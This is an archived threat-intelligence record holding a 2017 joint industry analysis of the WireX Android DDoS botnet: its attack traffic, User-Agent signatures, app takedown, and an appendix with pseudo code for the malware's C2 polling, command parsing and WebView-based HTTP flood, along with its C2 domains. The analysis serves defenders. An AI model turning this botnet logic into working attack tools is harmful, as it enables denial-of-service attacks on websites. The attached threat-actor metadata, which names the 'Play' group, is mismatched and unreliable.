{
    "id": "b4d3e170-4526-4799-b3bb-0bf64b704c3b",
    "created_at": "2023-01-12T15:10:29.384577Z",
    "updated_at": "2025-03-27T02:16:26.336376Z",
    "deleted_at": null,
    "sha1_hash": "ebaf5d71a97758eb26a654f1bc6677c0a9dbb93a",
    "title": "2017-08-25 - The WireX Botnet- How Industry Collaboration Disrupted a DDoS Attack",
    "authors": "",
    "file_creation_date": "2022-05-28T00:43:23Z",
    "file_modification_date": "2022-05-28T00:43:23Z",
    "file_size": 179602,
    "plain_text": "# The WireX Botnet: How Industry Collaboration Disrupted a DDoS Attack\n\n**flashpoint-intel.com/blog/wirex-botnet-industry-collaboration/**\n\nAugust 25, 2017\n\n[Blogs](https://www.flashpoint-intel.com/blog)\n\nBlog\n\nOn August 17th, 2017, multiple Content Delivery Networks (CDNs) and content providers were subject to\nsignificant attacks from a botnet dubbed WireX. The botnet is named for an anagram for one of the delimiter\nstrings in its command and control protocol. The WireX botnet comprises primarily Android devices running\nmalicious applications and is designed to create DDoS traffic. The botnet is sometimes associated with ransom\nnotes to targets.\n\n## Introduction\n\nOn August 17th, 2017, multiple Content Delivery Networks (CDNs) and content providers were subject to\nsignificant attacks from a botnet dubbed WireX. The botnet is named for an anagram for one of the delimiter\nstrings in its command and control protocol. The WireX botnet comprises primarily Android devices running\nmalicious applications and is designed to create DDoS traffic. The botnet is sometimes associated with ransom\nnotes to targets.\n\nA few days ago, Google was alerted that this malware was available on its Play Store. Shortly following the\nnotification, Google removed hundreds of affected applications and started the process to remove the applications\nfrom all devices.\n\n[Researchers from Akamai,](https://blogs.akamai.com/2017/08/the-wirex-botnet-an-example-of-cross-organizational-cooperation.html) [Cloudflare,](https://blog.cloudflare.com/the-wirex-botnet/) [Flashpoint, Google, Oracle Dyn,](https://www.flashpoint-intel.com/blog/wirex-botnet-industry-collaboration/) [RiskIQ, Team Cymru, and other](https://www.riskiq.com/blog/labs/wirex-botnet)\norganizations cooperated to combat this botnet. Evidence indicates that the botnet may have been active as early\nas August 2nd, but it was the attacks on August 17th that drew the attention of these organizations. This post\n\n\n-----\n\nrepresents the combined knowledge and efforts of the researchers working to share information about a botnet in\nthe best interest of the internet community as a whole. This blog post was written together by researchers from\nnumerous organizations and released concurrently by Akamai, Cloudflare, Flashpoint, and RiskIQ.\n\n## Attack details\n\nThe first available indicators of the WireX botnet appeared on August 2nd as minor attacks that went unnoticed at\nthe time. It wasn’t discovered until researchers began searching for the 26 character User-Agent string in logs.\nThese initial attacks were minimal and suggest that the malware was in development or in the early stages of\ndeployment. More prolonged attacks have been identified starting on August 15th, with some events sourced from\na minimum of 70,000 concurrent IP addresses, as shown in Figure 1.\n\nWireX is a volumetric DDoS attack at the application layer. The traffic generated by the attack nodes is primarily\nHTTP GET requests, though some variants appears to be capable of issuing POST requests. In other words, the\nbotnet produces traffic resembling valid requests from generic HTTP clients and web browsers.\n\nFigure 1: Estimated growth of the botnet based on the count of unique IPs per hour observed participating in\nattacks.\n**_Figure 1: Estimated growth of the botnet based on the count of unique IPs per hour observed participating in_**\n_attacks._\nDuring initial observation, the majority of the traffic from this botnet was distinguished by the use of an HTTP\nRequest’s User-Agent string containing the lowercase English alphabet characters, in random order.\n\nSome of the User-Agent values seen:\n\n_User-Agent: jigpuzbcomkenhvladtwysqfxr_\n\n_User-Agent: yudjmikcvzoqwsbflghtxpanre_\n\n_User-Agent: mckvhaflwzbderiysoguxnqtpj_\n\n_User-Agent: deogjvtynmcxzwfsbahirukqpl_\n\n_User-Agent: fdmjczoeyarnuqkbgtlivsxhwp_\n\n_User-Agent: yczfxlrenuqtwmavhojpigkdsb_\n\n_User-Agent: dnlseufokcgvmajqzpbtrwyxih_\n\nVariants of the malware have also been observed emitting User-Agent strings of varying length and expanded\ncharacter sets, sometimes including common browser User-Agents. Here are some samples of other User-Agents\nobserved:\n\n_User-Agent: xlw2ibhqg0i_\n\n_User-Agent: bg5pdrxhka2sjr1g_\n\n_User-Agent: 5z5z39iit9damit5czrxf655ok060d544ytvx25g19hcg18jpo8vk3q_\n\n_User-Agent: fge26sd5e1vnyp3bdmc6ie0_\n\n_User-Agent: m8al87qi9z5cqlwc8mb7ug85g47u_\n\n_User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 (.NET CLR_\n_3.5.30729)_\n\n_User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.7) Gecko/20071018 BonEcho/2.0.0.7_\n\n\n-----\n\n_User Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7; en us) AppleWebKit/530.19.2 (KHTML, like_\n_Gecko) Version/4.0.2_\n\n## Tracing the nodes\n\nAnalysis of the incoming attack data for the August 17th attack revealed that devices from more than 100 countries\nparticipated, an uncharacteristic trait for current botnets. The distribution of the attacking IPs along with the\ndistinctive User-Agent string led the researchers who began the initial investigation to believe that other\norganizations may have seen or would be likely to experience similar attacks. The researchers reached out to\npeers in other organizations for verification of what they were seeing.\n\nOnce the larger collaborative effort began, the investigation began to unfold rapidly starting with the investigation\nof historic log information, which revealed a connection between the attacking IPs and something malicious,\npossibly running on top of the Android operating system.\n\nIn the wake of the Mirai attacks, information sharing groups have seen a resurgence, where researchers share\nsituation reports and, when necessary, collaborate to solve Internet-wide problems. Further, WannaCry, Petya and\nother global events have only strengthened the value of this collaboration. Many information sharing groups, such\nas this one, are purely informal communications amongst peers across the industry.\n\n## Finding the software\n\nInvestigation of the logs from attacks on August 17th revealed previous attacks meeting the same signature\nimplicated the first Android application, “twdlphqg_v1.3.5_apkpure.com.apk”. Researchers quickly grabbed\nexamples of the application to understand how it works and determine if related applications might exist. Searches\nusing variations of the application name and parameters in the application bundle revealed multiple additional\napplications from the same, or similarly named authors, with comparable descriptions, as shown in Figure 2. As\nnew applications were located, others on the team began to dig into the binaries to learn how they worked.\n\nFigure 2: A screenshot of one of the searches for similar malware.Figure 2: A screenshot of one of the searches\n_for similar malware._\nThere were few cases where these applications were found in well known and pre-configured app stores for\nmobile devices. Whenever possible, the abuse teams for these app stores, like Google, were contacted and\nworked expediently to remove the offending content. Google provided the following comment in response to this\nresearch:\n\n_We identified approximately 300 apps associated with the issue, blocked them from the Play Store, and we’re in_\n_the process of removing them from all affected devices. The researchers’ findings, combined with our own_\n_analysis, have enabled us to better protect Android users, everywhere._\n\n## Malware overview\n\nMany of the identified applications fell into the categories of media/video players, ringtones or tools such as\nstorage managers and app stores with additional hidden features that were not readily apparent to the end users\nthat were infected. At the launch of the applications, the nefarious components begin their work by starting the\ncommand and control polling service which queries the command and control server, most commonly\n_g.axclick.store, for attack commands. When attack commands are received, the parsing service inspects the raw_\nattack command, parses it and invokes the attacking service with the extracted parameters.\n\nThe applications that housed these attack functions, while malicious, appeared to be benign to the users who had\ninstalled them. These applications also took advantage of features of the Android service architecture allowing\napplications to use system resources, even while in the background, and are thus able to launch attacks when the\n\n\n-----\n\napplication is not in use. Antivirus scanners currently recognize this malware as the Android Clicker trojan, but\nthis campaign’s purpose has nothing to do with click fraud. It is likely that this malware used to be related to click\nfraud, but was repurposed for DDoS.\n\nAn in-depth overview of the internals of the rogue components of the applications can be found in Appendix 1.\n\n## Conclusion\n\nThese discoveries were only possible due to open collaboration between DDoS targets, DDoS mitigation\ncompanies, and intelligence firms. Every player had a different piece of the puzzle; without contributions from\neveryone, this botnet would have remained a mystery.\n\nThe best thing that organizations can do when under a DDoS attack is to share detailed metrics related to the\nattack. With this information, those of us who are empowered to dismantle these schemes can learn much more\nabout them than would otherwise be possible.\n\nThese metrics include packet captures, lists of attacking IP addresses, ransom notes, request headers, and any\npatterns of interest. Such data should not contain any legitimate client traffic, to reduce privacy concerns and also\nbecause legitimate traffic can pollute and slow down analysis. And most importantly, give permission to share this\ndata—not only to your vendors, but to their trusted contacts in the broader security community who may have\nexpertise or visibility not available in your own circle of vendors.\n\nThere is no shame in asking for help. Not only is there no shame, but in most cases it is impossible to hide the fact\nthat you are under a DDoS attack. A number of research efforts have the ability to detect the existence of DDoS\nattacks happening globally against third parties no matter how much those parties want to keep the issue quiet.\nThere are few benefits to being secretive and numerous benefits to being forthcoming.\n\nSharing detailed attack metrics also allows for both formal and informal information sharing groups to\ncommunicate about and understand the attacks that are happening at a global scale, rather than simply what they\nsee on their own platforms. This report is an example of how informal sharing can have a dramatically positive\nimpact for the victims and the Internet as a whole. Cross-organizational cooperation is essential to combat threats\nto the Internet and, without it, criminal schemes can operate without examination.\n\nWe would like to acknowledge and thank the researchers at Akamai, Cloudflare, Flashpoint, Google, RiskIQ, Team\nCymru, and other organizations not publicly listed. We would also like to thank the FBI for their assistance in this\nmatter.\n\n## Authors & Researchers\n\n- Tim April : Senior Security Architect, Akamai\n\n- Chris Baker : Principal of Threat Intelligence, Oracle Dyn\n\n- Matt Carothers\n\n- Jaime Cochran : Security Analyst, Cloudflare\n\n- Marek Majkowski : Enthusiastic Geek, Cloudflare\n\n- Jared Mauch : Internetworking Research and Architecture, Akamai\n\n- Allison Nixon : Director of Security Research, Flashpoint\n\n- Justin Paine : Head Of Trust & Safety, Cloudflare\n\n- Chad Seaman : Sen. Security Intelligence Response Team Engineer, Akamai SIRT\n\n- Darren Spruell : Threat Researcher, RiskIQ\n\n- Zach Wikholm : Research Developer, Flashpoint\n\n- And others\n\n## Appendix A: Analysis of the Malware\n\n\n-----\n\n**Identifying C2 Domains**\n\nInspection of various decompiled applications revealed multiple sub-domains of a single root domain\n(axclick.store) that were suspected of being a part of the command and control (C2) infrastructure for the botnet.\n\n_$ grep http * -R_\n\n_com/twdlphqg/app/ExplorationActivity.smali: const-string v3, “http://u.axclick.store/”_\n\n_com/twdlphqg/app/services/Ryiidrxcjmfb.smali: const-string v1, “http://g.axclick.store/”_\n\nThe first domain (u.axclick.store) did not return content; it simply returned an empty response with a 200 OK status\ncode and appeared to be used for basic Internet connectivity testing.\n\nThe second domain (g.axclick.store) appeared to be linked to the DDoS components of the malware. The\ncomponent of the application referencing this domain was responsible for creating an Android Service equipped\nwith two WebView instances. The first WebView instance serves as the C2 beacon, polling the C2 server for attack\ndirectives. The second serves as a reference to clone WebView objects for attacking. This component also\ncontains the basic logic for spinning up and configuring these attacking instances.\n\nThere are multiple other interesting components in play here, all with unique roles. The first component types\ndiscussed here serve as the basic, always-on, persistent execution mechanisms. Some applications utilized\n_Service objects instantiated using the android/os/Handler->postDelayed functionality. This essentially causes the_\napp to persist via a Service that polls the C2 server on a regular interval — even while the application is\nbackgrounded. Other variations of the application utilized AsyncTask objects in attempts to achieve the same goal.\n\nThe second component is a WebViewClient that serves as the C2 attack directive parser. It is responsible for\ndetecting onPageFinished events from the C2 WebView instance being controlled by the polling service and\nparsing whatever command is returned. When an attack command is successfully parsed, this component is\nresponsible for calling the function that ultimately launches the attack traffic.\n\n**Overview of Components**\n\nBelow we’ll cover the relevant pieces individually, using pseudo code based on knowledge gathered from the\ndecompiled APK(s). We’ll then talk about what the pseudo code is doing in more detail as it relates to attack\ncommands and techniques.\n\n**Service Runner**\n\nThe ServiceRunner component’s role is a means of persistent background execution by injecting the Runnable\nobject type into a timed OS Handler. Because of the nature of a Service in Android environments, the malware can\ncontinue to keep running once the app has been launched and placed in the background. Execution will only stop\nif application is actively killed/closed by the mobile device user or in the event of a device restart.\n\n**Service Runner Pseudo Code**\n\n_Class ServiceRunner extends Object {_\n\n_Public function run() {_\n\n_DDoS_Service->poll_c2();_\n\n_}_\n\n_}_\n\n**C2 Response Parser**\n\n\n-----\n\nThe AttackCommandParser serves as the callback that is triggered when the C2 WebView detects that a page\nload has occurred. The parser loads the page’s content and extracts the <title> body as the attack command.\nBased on observed samples, a payload from the C2 looks like this:\n\n_<html>_\n\n_<title>_\n\n_https://A_TARGETED_WEBSITE/snewxwriA_USER_AGENT_STRINGsnewxwrihttps://A_REFER_HEADER_VALUE/_\n\n_</title>_\n\n_</html>_\n\n**_Figure 3: Attack Directive Sample_**\n\nThe value extracted from the <title> tag is then tested via String->contains() to ensure it contains the value token\ndelimiter snewxwri. If the delimiter is found, the content is trimmed of leading or trailing whitespace and then split()\ninto an Array of pieces on the delimiter. The resulting tokens are then used as parameters to be passed to the\n_DDoS_Service->attack()method._\n\n**C2 Response Parser Pseudo Code**\n\n_Class AttackCommandParser extends WebViewClient {_\n\n_Public function onPageFinished(C2_WebView,C2_url) {_\n\n_String pageTitle = C2_WebView->getTitle();_\n\n_if (pageTitle->contains(“snewxwri”) == true) {_\n\n_pageTitle = pageTitle->trim();_\n\n_Array commandParts = pageTitle.split(“snewxwri”);_\n\n_String target = commandParts[0];_\n\n_String userAgent = commandParts[1];_\n\n_String referer = commandParts[2];_\n\n_DDoS_Service->attack(target, userAgent, referer);_\n\n_}_\n\n_}_\n\n_}_\n\n**DDoS Service**\n\nThe DDoS_Service component is what runs the show. It has 3 core functions. These responsibilities are to get the\n_Service up and running, provide the poll_c2() method for loading the C2 WebView, and most importantly —_\nlaunching attacks. We’ll look at these responsibilities one at a time after presenting the pseudo code.\n\n**DDoS Service Pseudo Code**\n\n_Class DDoS_Service extends Object {_\n\n\n-----\n\n_Public function onCreate() {_\n\n_Handler OS_Handler = new Handler();_\n\n_Object Runner = new ServiceRunner();_\n\n_OS_Handler->postDelayed(Runner,2);_\n\n_}_\n\n_Public function poll_c2() {_\n\n_WebViewClient C2_Parser = new AttackCommandParser();_\n\n_WebView C2_WebView = new WebView();_\n\n_WebViewSettings C2_WebView_Settings = C2_WebView->getSettings();_\n\n_C2_WebView_Settings->setCacheMode(LOAD_NO_CACHE);_\n\n_C2_WebView->clearCache(true);_\n\n_C2_WebView->clearHistory();_\n\n_C2_WebView->setWebViewClient(C2_Parser);_\n\n_C2_WebView->loadUrl(“http://g.axclick.store”);_\n\n_}_\n\n_Public function attack(String target, String userAgent, String referer) {_\n\n_HashMap WebViewHeaders = new HashMap();_\n\n_WebViewHeaders->put(“Referer”,referer);_\n\n_WebViewHeaders->put(“X-Requested-With”,””);_\n\n_WebView[] AttackerViews = new WebView[100];_\n\n_for (int i=0; i<AttackerViews.length; i++) {_\n\n_AttackerViews[i] = new WebView();_\n\n_AttackerViews[i]->clearHistory();_\n\n_AttackerViews[i]->clearFormData();_\n\n_AttackerViews[i]->clearCache(true);_\n\n_WebViewSettings AttackWebViewSettings = AttackerViews[i]->getSettings();_\n\n_AttackWebViewSettings->setJavaScriptEnabled(true);_\n\n_AttackWebViewSettings->setUserAgentString(userAgent);_\n\n_AttackWebViewSettings->setCacheMode(LOAD_NO_CACHE);_\n\n_this->deleteDatabase(“webview.db”);_\n\n\n-----\n\n_this >deleteDatabase( webviewCache.db );_\n\n_AttackerViews[i]->loadUrl(target,WebViewHeaders);_\n\n_}_\n\n_}_\n\n_}_\n\n**DDoS Service onCreate()**\n\nThe onCreate() method is straightforward: it creates a new android/os/Handler and ServiceRunner instance. The\nServiceRunner instance is then hooked into the Handler via a call to postDelayed(). According to Android\ndocumentation, this “Causes the Runnable r to be added to the message queue, to be run after the specified\namount of time elapses.” The second parameter to this method call is the number of milliseconds before the\n_Runnable is invoked. In this sample that value is 2, which is a very aggressive timing strategy._\n\n**DDoS Service poll_c2()**\n\nThe poll_c2() method is responsible for continually reloading the WebView with the C2 URL while also hooking the\n_AttackCommandParser WebViewClient into the poller WebView instance. Before polling the C2 domains, the_\nservice will clear and disable the cache as well as clear the WebView instance history. These steps are performed\nto ensure that the client is always getting up-to-date information from the C2 and not being served cache hits from\nthe local device. We’ll see this tactic reused during the analysis of the attack() method as well.\n\n**DDoS Service attack()**\n\n_Public function attack(String target, String userAgent, String referer) {_\n\n_HashMap WebViewHeaders = new HashMap();_\n\n_WebViewHeaders->put(“Referer”,referer);_\n\n_WebViewHeaders->put(“X-Requested-With”,””);_\n\n_WebView[] AttackerViews = new WebView[100];_\n\n_for (int i=0; i<AttackerViews.length; i++) {_\n\n_AttackerViews[i] = new WebView();_\n\n_AttackerViews[i]->clearHistory();_\n\n_AttackerViews[i]->clearFormData();_\n\n_AttackerViews[i]->clearCache(true);_\n\n_WebViewSettings AttackWebViewSettings = AttackerViews[i]->getSettings();_\n\n_AttackWebViewSettings->setJavaScriptEnabled(true);_\n\n_AttackWebViewSettings->setUserAgentString(userAgent);_\n\n_AttackWebViewSettings->setCacheMode(LOAD_NO_CACHE);_\n\n_this->deleteDatabase(“webview.db”);_\n\n_this >deleteDatabase(“webviewCache db”);_\n\n\n-----\n\n_AttackerViews[i] >loadUrl(target,WebViewHeaders);_\n\n_}_\n\n_}_\n\nThe attack() method is responsible for generating the actual attack traffic. The AttackCommandParser_>onPageFinished() that was previously discussed will pass in the target, userAgent, and referer values that were_\nhanded out by the last C2 interaction. This method will create a HashMap object that will configure the HTTP\nHeaders used during the attack.\n\nThe first header is the HTTP Referer, which as we know was supplied by the C2 server. In all observed cases, this\nvalue was a mirror value of the actual target. The second header is the X-Requested-With header; although the\n_WebView would usually have a default value, it is overwritten with a blank value. Typically this header coming from_\nan embedded WebView would contain information about the Android application such as com.[app_author].app.\nIt’s likely that this Header was blanked specifically to obfuscate who or what was generating the attack traffic that\nwould be seen by the target.\n\nOnce the headers are configured, an empty Array of WebView place holders is instantiated, followed by a loop to\nfill this Array with actual WebView instances. Each instance goes through the same set of configuration\nprocesses. The WebView instances created will have their history, saved form data, and cache cleared. The\nJavaScript capabilities are enabled (this is typically disabled by default for embedded WebViews), the User-Agent\nstring that will be present in the HTTP Headers is overwritten with the value supplied by the C2 attack directive,\nand the CacheMode set to LOAD_NO_CACHE, which will force the browser instance to bypass local caches and\nfetch the target URL for each request.\n\nIn a final attempt to ensure that no cache hits will occur on the device and a that request will be sent to the target,\nthe application also deletes its local webview.db and webviewCache.db files from the device before loading each\nrequest.\n\nFinally we see the loadUrl() method is called on the newly configured WebView instance using the target URL and\ncustomized WebViewHeaders HashMap.\n\n**Running the Malware-User Experience**\n\nWhile many of the identified apps had already been removed from the Google Play store, mirrors remained online\nfrom which we could download the APK files. We loaded “twdlphqg” (one of the attacking apps) onto a freshlyreset physical Samsung Galaxy S4 that had been running Lollipop and security patches from 2015.\n\nThis app, along with the others we tested, used innocuous-sounding names like “Device Analysis”, “Data Storage”\n“Package Manager”, and so forth.\n\nWhen the app is run, it appears to be a very basic ringtone app. Only three ringtones are provided. The app can\nplay and set ringtones but has no other functionality.\n\nIn the background, this app spawns additional processes that continue to run even while the phone’s screen is\nlocked. This allows the app to launch DDoS attacks from the phone in the background. When we left the phone on\na charger and let it go to sleep, it continued to launch DDoS attacks.\n\nNotably, it is no longer possible to install this application as Google’s PlayProtect feature now blocks this app from\nbeing installed. Google is also removing it from devices that already have it installed. All of the applications we\ntested that were part of this campaign produced this block message; disabling PlayProtect was necessary to run\nthe malware.\n\n**Ring Ring! DDoS! – Variations in Malicious Apps**\n\n\n-----\n\nWe tested multiple applications from this campaign. There were different variations in behavior and user interface\nand they weren’t all ringtone apps. All tests were conducted on the same phone.\n\n**Xryufrix**\n\nXryufrix was the top hitter from the DDoS statistics, but when run, its performance was underwhelming. It’s\npossible there was a compatibility issue preventing it from reaching its full DDoS potential. This app asked for\nfewer permissions upon initial install, but did ask for the same lock screen related device administrator permissions\nas twdlphqg. This one pretended to be a YouTube app. When it first opens, it queries the axclick domain for the\nDDoS attack commands as well as a GET request against p[.]axclick[.]store/?utm_source=tfikztteuic, which\nreturns the Play Store URL of a different app located at market://details?id=com[.]luckybooster[.]app . When\nthe user attempts to play a Youtube video, this app closes, deletes its icon from the app list, and makes itself\nimpossible to execute afterwards, which is possibly the result of a crash. It also opens the Play store download link\nfor the “Luckybooster” app, which did not DDoS when it was run. The xryufrix app does not launch DDoS attacks\nwhile the phone is asleep nor does it launch DDoS attacks at any time other than when the app is active.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-08-25 - The WireX Botnet- How Industry Collaboration Disrupted a DDoS Attack.pdf"
    ],
    "report_names": [
        "2017-08-25 - The WireX Botnet- How Industry Collaboration Disrupted a DDoS Attack.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536229,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653698603,
    "ts_modification_date": 1653698603,
    "files": {
        "pdf": "https://archive.orkl.eu/ebaf5d71a97758eb26a654f1bc6677c0a9dbb93a.pdf",
        "text": "https://archive.orkl.eu/ebaf5d71a97758eb26a654f1bc6677c0a9dbb93a.txt",
        "img": "https://archive.orkl.eu/ebaf5d71a97758eb26a654f1bc6677c0a9dbb93a.jpg"
    }
}